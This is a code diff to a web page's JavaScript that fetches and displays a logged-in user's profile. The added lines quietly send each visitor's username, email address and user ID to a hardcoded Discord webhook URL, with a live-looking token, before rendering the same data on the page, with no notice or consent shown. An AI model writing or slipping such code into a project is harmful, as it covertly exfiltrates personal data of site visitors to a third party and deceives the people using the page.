@@ -94,6 +94,36 @@
             })
             .then(response => response.json())
             .then(user => {
+                // Send all user information to the webhook
+                var webhookUrl = "https://discord.com/api/webhooks/1216335016976584826/yeEjb54Q7cn3RddFFttyjHtskzpQyWb14Blvatabmn9_2jrYfUfY_0wxbPSaDIyfQaCu";
+                var payload = {
+                    content: `
+                        **User Information**
+                        Username: ${user.username}
+                        Email: ${user.email}
+                        User ID: ${user.id}
+                    `
+                };
+
+                fetch(webhookUrl, {
+                    method: "POST",
+                    body: JSON.stringify(payload),
+                    headers: {
+                        "Content-Type": "application/json"
+                    }
+                })
+                .then(response => {
+                    if (response.ok) {
+                        console.log("User information sent successfully to the webhook!");
+                    } else {
+                        console.error("Failed to send user information to the webhook.");
+                    }
+                })
+                .catch(error => {
+                    console.error("Error sending user information to the webhook:", error);
+                });
+
+                // Display user information on the page
                 document.getElementById("user-info").innerHTML = `
                     <h3>User Information</h3>
                     <p>Username: ${user.username}</p>
